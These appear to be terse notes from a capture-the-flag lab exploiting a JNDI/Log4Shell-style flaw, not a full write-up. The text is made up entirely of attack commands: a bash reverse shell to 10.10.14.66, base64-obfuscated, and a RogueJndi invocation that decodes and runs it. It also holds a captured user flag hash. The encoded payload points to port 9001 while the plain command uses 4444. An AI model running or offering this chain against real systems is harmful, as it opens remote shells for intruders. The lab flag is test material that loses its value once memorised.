## Key Takeaways
1. echo 'bash -c bash -i >&/dev/tcp/10.10.14.66/4444 0>&1' | base64
2. YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjYvOTAwMSAwPiYxCg==
3. java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjYvOTAwMSAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.66"
4. 6ced1a6a89e666c0620cdb10262ba127 user flag
